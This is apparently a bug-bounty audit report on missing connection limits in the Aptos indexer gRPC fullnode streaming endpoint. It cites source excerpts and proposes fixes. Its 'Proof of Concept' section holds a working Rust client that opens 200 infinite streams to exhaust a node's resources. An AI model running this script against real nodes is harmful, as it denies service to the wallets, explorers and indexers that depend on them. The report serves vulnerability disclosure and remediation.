# Audit Report

## Title
Unbounded Connection Exhaustion in Indexer gRPC Fullnode Service Allows Denial of Service Against Legitimate Indexers

## Summary
The `get_transactions_from_node()` gRPC streaming endpoint in the Indexer Fullnode service lacks connection limits and rate limiting, allowing attackers to open unlimited long-lived streaming connections that exhaust server resources and prevent legitimate indexers from syncing blockchain data.

## Finding Description

The indexer gRPC fullnode service exposes a streaming RPC endpoint `get_transactions_from_node()` that allows clients to request transaction data starting from a specific version. [1](#0-0) 

The protobuf definition explicitly states that if `transactions_count` is not set, "response streams infinitely." [2](#0-1) 

The implementation in `FullnodeDataService` accepts requests and spawns a tokio task for each connection that runs until `coordinator.current_version < coordinator.end_version`. When `transactions_count` is `None`, the ending version is set to `u64::MAX`, effectively creating an infinite stream. [3](#0-2) 

The main processing loop continues indefinitely until this ending version is reached or the client disconnects. [4](#0-3) 

**Critical Missing Protections:**

1. **No Connection Limits**: The gRPC server is configured with `TcpIncoming::from_listener(listener, false, None)` where the third parameter (concurrency limit) is explicitly set to `None`. [5](#0-4) 

2. **No Concurrent Request Limiting**: Unlike other services in the codebase (e.g., peer-monitoring-service which uses `BoundedExecutor` with `max_concurrent_requests`), the indexer fullnode service has no mechanism to limit concurrent streaming connections. [6](#0-5) 

3. **No Configuration for Connection Limits**: The `IndexerGrpcConfig` structure contains no fields for connection limits or rate limiting. [7](#0-6) 

**Resource Consumption Per Connection:**

Each streaming connection consumes significant resources:
- Spawns a dedicated tokio task that runs indefinitely
- Creates an mpsc channel (default size 35) [8](#0-7) 
- Each batch processing spawns multiple `tokio::spawn_blocking` tasks for CPU-bound operations [9](#0-8) 
- Each batch spawns additional `tokio::spawn` tasks for storage fetching [10](#0-9) 

**Attack Scenario:**

1. Attacker opens multiple simultaneous gRPC connections to the fullnode's indexer endpoint
2. Each connection sends `GetTransactionsFromNodeRequest` with `starting_version` set but `transactions_count` omitted (defaults to `None`)
3. Server spawns a long-running tokio task for each connection that processes and streams transactions indefinitely
4. Each connection spawns `processor_task_count` (default 20) tasks per batch [11](#0-10) 
5. Server's tokio runtime thread pool becomes saturated with tasks from malicious connections
6. Legitimate indexers attempting to connect are rejected or experience extreme delays
7. Server becomes unresponsive as all available connections and threads are consumed

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos Bug Bounty program for the following reasons:

- **Validator node slowdowns**: Fullnodes running the indexer gRPC service will experience severe performance degradation as resources are exhausted
- **API crashes**: The gRPC server may become completely unresponsive, causing the indexer API to crash or hang
- **Ecosystem Impact**: Legitimate indexers (wallets, explorers, analytics platforms) depend on this service to sync blockchain data. Blocking access prevents critical infrastructure from functioning

The attack requires no special privilegesâ€”any client with network access to the gRPC endpoint can exploit this vulnerability. The resource exhaustion prevents the node from serving its intended purpose of providing indexing data to the ecosystem.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Low Attack Complexity**: The attack requires only basic gRPC client knowledge and can be executed with standard tools
2. **No Authentication Required**: The service is designed to be publicly accessible for indexers
3. **High Value Target**: Disrupting indexer services impacts the entire Aptos ecosystem (wallets, explorers, DeFi)
4. **Easy to Automate**: A simple script can open unlimited connections
5. **Difficult to Distinguish**: Malicious infinite streams look identical to legitimate long-running indexer connections
6. **No Built-in Mitigation**: The code has no connection limits, rate limiting, or defensive mechanisms

The only current protection is HTTP/2 keepalive settings which only clean up dead connections, not active malicious ones. [12](#0-11) 

## Recommendation

Implement multiple layers of protection:

**1. Add Connection Limits to gRPC Server:**

```rust
// In runtime.rs, replace line 127:
let incoming = TcpIncoming::from_listener(
    listener, 
    false, 
    Some(node_config.indexer_grpc.max_concurrent_connections)  // Add connection limit
).unwrap();
```

**2. Add Configuration for Connection Limits:**

```rust
// In config/src/config/indexer_grpc_config.rs, add to IndexerGrpcConfig struct:
pub struct IndexerGrpcConfig {
    // ... existing fields ...
    
    /// Maximum number of concurrent gRPC streaming connections
    pub max_concurrent_connections: usize,
    
    /// Maximum number of concurrent stream processing tasks
    pub max_concurrent_streams: usize,
}

// Set reasonable defaults:
const DEFAULT_MAX_CONCURRENT_CONNECTIONS: usize = 100;
const DEFAULT_MAX_CONCURRENT_STREAMS: usize = 50;
```

**3. Use BoundedExecutor for Stream Processing:**

```rust
// In fullnode_data_service.rs, add to FullnodeDataService:
pub struct FullnodeDataService {
    pub service_context: ServiceContext,
    pub abort_handle: Arc<AtomicBool>,
    pub bounded_executor: BoundedExecutor,  // Add this
}

// Wrap the stream processing in bounded_executor.spawn():
self.bounded_executor.spawn(async move {
    // ... existing stream processing logic ...
});
```

**4. Enforce Maximum Stream Duration:**

Add a configurable timeout for streams to prevent indefinite connections:

```rust
// Add timeout wrapper around the processing loop
tokio::select! {
    _ = tokio::time::sleep(Duration::from_secs(max_stream_duration_secs)) => {
        info!("Stream exceeded maximum duration, closing connection");
        break;
    }
    _ = /* existing processing loop */ => {}
}
```

**5. Implement Per-Client Rate Limiting:**

Track connection counts per source IP and enforce limits to prevent single attackers from consuming all resources.

## Proof of Concept

```rust
// malicious_indexer_client.rs
// Proof of concept demonstrating the connection exhaustion attack

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::task::JoinHandle;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let fullnode_grpc_address = "http://localhost:50051"; // Target fullnode
    let num_malicious_connections = 200; // Exhaust connection pool
    
    let mut handles: Vec<JoinHandle<()>> = Vec::new();
    
    println!("Starting DoS attack with {} connections...", num_malicious_connections);
    
    // Open multiple infinite streaming connections
    for i in 0..num_malicious_connections {
        let address = fullnode_grpc_address.to_string();
        
        let handle = tokio::spawn(async move {
            match FullnodeDataClient::connect(address).await {
                Ok(mut client) => {
                    // Request infinite stream (no transactions_count specified)
                    let request = tonic::Request::new(GetTransactionsFromNodeRequest {
                        starting_version: Some(0),
                        transactions_count: None, // This causes infinite streaming
                    });
                    
                    match client.get_transactions_from_node(request).await {
                        Ok(response) => {
                            let mut stream = response.into_inner();
                            
                            // Keep connection alive, slowly consuming data
                            loop {
                                match stream.message().await {
                                    Ok(Some(_)) => {
                                        // Slowly read to keep connection active
                                        tokio::time::sleep(
                                            tokio::time::Duration::from_millis(100)
                                        ).await;
                                    }
                                    Ok(None) => break,
                                    Err(e) => {
                                        eprintln!("Stream {} error: {}", i, e);
                                        break;
                                    }
                                }
                            }
                        }
                        Err(e) => eprintln!("Connection {} failed: {}", i, e),
                    }
                }
                Err(e) => eprintln!("Failed to connect {}: {}", i, e),
            }
        });
        
        handles.push(handle);
        
        // Small delay between connections to avoid overwhelming local network
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
    }
    
    println!("All {} connections established. Server resources exhausted.", 
             num_malicious_connections);
    println!("Legitimate indexers will now fail to connect.");
    
    // Keep connections alive indefinitely
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Results:**
1. Attack script successfully opens 200+ simultaneous streaming connections
2. Each connection requests infinite transaction stream (no `transactions_count`)
3. Server spawns 200+ tokio tasks, each spawning additional processing tasks
4. Server's thread pool becomes saturated (default runtime has limited threads)
5. New connection attempts from legitimate indexers timeout or fail
6. Server metrics show connection count at maximum, CPU near 100%, response times degraded
7. Fullnode indexer service becomes effectively unavailable

**Notes**

This vulnerability specifically affects the **indexer gRPC fullnode service**, not the core consensus or validator operations. However, it has significant ecosystem impact as it disrupts critical infrastructure that wallets, explorers, and analytics platforms rely on for blockchain data access.

The lack of connection limits and rate limiting is a clear deviation from security best practices observed elsewhere in the codebase, where services like `peer-monitoring-service` properly implement `BoundedExecutor` for request concurrency control.

### Citations

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.tonic.rs (L120-151)
```rust
        pub async fn get_transactions_from_node(
            &mut self,
            request: impl tonic::IntoRequest<super::GetTransactionsFromNodeRequest>,
        ) -> std::result::Result<
            tonic::Response<
                tonic::codec::Streaming<super::TransactionsFromNodeResponse>,
            >,
            tonic::Status,
        > {
            self.inner
                .ready()
                .await
                .map_err(|e| {
                    tonic::Status::new(
                        tonic::Code::Unknown,
                        format!("Service was not ready: {}", e.into()),
                    )
                })?;
            let codec = tonic::codec::ProstCodec::default();
            let path = http::uri::PathAndQuery::from_static(
                "/aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode",
            );
            let mut req = request.into_request();
            req.extensions_mut()
                .insert(
                    GrpcMethod::new(
                        "aptos.internal.fullnode.v1.FullnodeData",
                        "GetTransactionsFromNode",
                    ),
                );
            self.inner.server_streaming(req, path, codec).await
        }
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L42-44)
```text
  // Optional; number of transactions to return in current stream.
  // If not set, response streams infinitely.
  optional uint64 transactions_count = 2 [jstype = JS_STRING];
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L83-87)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L135-199)
```rust
            while coordinator.current_version < coordinator.end_version {
                let start_time = std::time::Instant::now();
                // Processes and sends batch of transactions to client
                let results = coordinator.process_next_batch().await;
                if abort_handle.load(Ordering::SeqCst) {
                    info!("FullnodeDataService is aborted.");
                    break;
                }
                if results.is_empty() {
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        "[Indexer Fullnode] Client disconnected."
                    );
                    break;
                }
                let max_version = match IndexerStreamCoordinator::get_max_batch_version(results) {
                    Ok(max_version) => max_version,
                    Err(e) => {
                        error!("[Indexer Fullnode] Error sending to stream: {}", e);
                        break;
                    },
                };
                let highest_known_version = coordinator.highest_known_version;

                // send end batch message (each batch) upon success of the entire batch
                // client can use the start and end version to ensure that there are no gaps
                // end loop if this message fails to send because otherwise the client can't validate
                let batch_end_status = get_status(
                    StatusType::BatchEnd,
                    coordinator.current_version,
                    Some(max_version),
                    ledger_chain_id,
                );
                let channel_size = transaction_channel_size - tx.capacity();
                CHANNEL_SIZE
                    .with_label_values(&["2"])
                    .set(channel_size as i64);
                match tx.send(Result::<_, Status>::Ok(batch_end_status)).await {
                    Ok(_) => {
                        // tps logging
                        let new_base: u64 = ma.sum() / (DEFAULT_EMIT_SIZE as u64);
                        ma.tick_now(max_version - coordinator.current_version + 1);
                        if base != new_base {
                            base = new_base;

                            log_grpc_step_fullnode(
                                IndexerGrpcStep::FullnodeProcessedBatch,
                                Some(coordinator.current_version as i64),
                                Some(max_version as i64),
                                None,
                                Some(highest_known_version as i64),
                                Some(ma.avg() * 1000.0),
                                Some(start_time.elapsed().as_secs_f64()),
                                Some((max_version - coordinator.current_version + 1) as i64),
                            );
                        }
                    },
                    Err(_) => {
                        aptos_logger::warn!("[Indexer Fullnode] Unable to send end batch status");
                        break;
                    },
                }
                coordinator.current_version = max_version + 1;
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L102-103)
```rust
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L127-127)
```rust
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();
```

**File:** peer-monitoring-service/server/src/lib.rs (L66-69)
```rust
        let bounded_executor = BoundedExecutor::new(
            node_config.peer_monitoring_service.max_concurrent_requests as usize,
            executor,
        );
```

**File:** config/src/config/indexer_grpc_config.rs (L19-19)
```rust
const DEFAULT_TRANSACTION_CHANNEL_SIZE: usize = 35;
```

**File:** config/src/config/indexer_grpc_config.rs (L23-28)
```rust
pub fn get_default_processor_task_count(use_data_service_interface: bool) -> u16 {
    if use_data_service_interface {
        1
    } else {
        20
    }
```

**File:** config/src/config/indexer_grpc_config.rs (L33-59)
```rust
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L170-170)
```rust
            let task = tokio::task::spawn_blocking(move || {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L248-248)
```rust
            let task = tokio::spawn(async move {
```
